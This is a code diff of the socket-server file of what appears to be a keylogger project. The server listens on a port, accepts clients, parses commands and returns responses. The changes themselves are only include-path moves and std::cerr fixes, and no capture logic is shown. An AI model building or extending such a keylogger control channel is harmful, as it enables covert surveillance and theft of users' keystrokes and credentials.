@@ -2,9 +2,9 @@
 #include "SocketServer.h"
 
 #include "Keylogger.h"
-#include "ComputerInfoHelper.h"
-#include "CommandParser.h"
-#include "StringHelper.h"
+#include "helpers/ComputerInfoHelper.h"
+#include "services/CommandParser.h"
+#include "helpers/StringHelper.h"
 
 SocketServer::SocketServer(Keylogger* logger) {
     listenSocket = INVALID_SOCKET;
@@ -13,7 +13,7 @@ SocketServer::SocketServer(Keylogger* logger) {
     WSADATA wsaData;
     int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (result != 0) {
-        cerr << "WSAStartup failed: " << result << "\n";
+        std::cerr << "WSAStartup failed: " << result << "\n";
     }
 
     struct addrinfo* addr = nullptr;
@@ -33,7 +33,7 @@ SocketServer::SocketServer(Keylogger* logger) {
         StringHelper::ws2s(ComputerInfoHelper::getInstance()->getPort()).c_str(), &hints, &addr);
 
     if (result != 0) {
-        cerr << "getaddrinfo failed: " << result << "\n";
+        std::cerr << "getaddrinfo failed: " << result << "\n";
         WSACleanup();
     }
 
@@ -41,7 +41,7 @@ SocketServer::SocketServer(Keylogger* logger) {
         addr->ai_protocol);
 
     if (this->listenSocket == INVALID_SOCKET) {
-        cerr << "Error at socket: " << WSAGetLastError() << "\n";
+        std::cerr << "Error at socket: " << WSAGetLastError() << "\n";
         freeaddrinfo(addr);
         WSACleanup();
     }
@@ -49,7 +49,7 @@ SocketServer::SocketServer(Keylogger* logger) {
     int bindResult = ::bind(this->listenSocket, addr->ai_addr, (int)addr->ai_addrlen);
 
     if (listen(this->listenSocket, SOMAXCONN) == SOCKET_ERROR) {
-        cerr << "listen failed with error: " << WSAGetLastError() << "\n";
+        std::cerr << "listen failed with error: " << WSAGetLastError() << "\n";
         closesocket(this->listenSocket);
         this->listenSocket = INVALID_SOCKET;
         WSACleanup();
@@ -58,7 +58,7 @@ SocketServer::SocketServer(Keylogger* logger) {
 
 void SocketServer::start() {
     if (this->listenSocket == INVALID_SOCKET) {
-        cerr << "socket is not active" << std::endl;
+        std::cerr << "socket is not active" << std::endl;
         return;
     } else {
         std::wcout << "socket active" << std::endl;
@@ -72,7 +72,7 @@ void SocketServer::start() {
         std::wcout << L"accepted client: " << clientSocket << std::endl;
 
         if (clientSocket == INVALID_SOCKET) {
-            cerr << "accept failed: " << WSAGetLastError() << std::endl;
+            std::cerr << "accept failed: " << WSAGetLastError() << std::endl;
             closesocket(this->listenSocket);
             WSACleanup();
             continue;
@@ -85,10 +85,10 @@ void SocketServer::start() {
             std::wstring response;
 
             if (receivedSize == SOCKET_ERROR) {
-                cerr << "recv failed: " << receivedSize << std::endl;
+                std::cerr << "recv failed: " << receivedSize << std::endl;
                 break;
             } else if (receivedSize == 0) {
-                cerr << "connection closed..." << std::endl;
+                std::cerr << "connection closed..." << std::endl;
             } else if (receivedSize > 0) {
                 requestBuffer[receivedSize / 2] = '\0';
                 std::wstring request = std::wstring(requestBuffer);
@@ -104,7 +104,7 @@ void SocketServer::start() {
                 }
 
                 if (sendResult == SOCKET_ERROR) {
-                    cerr << "send failed: " << WSAGetLastError() << std::endl;
+                    std::cerr << "send failed: " << WSAGetLastError() << std::endl;
                 }
             }
         }
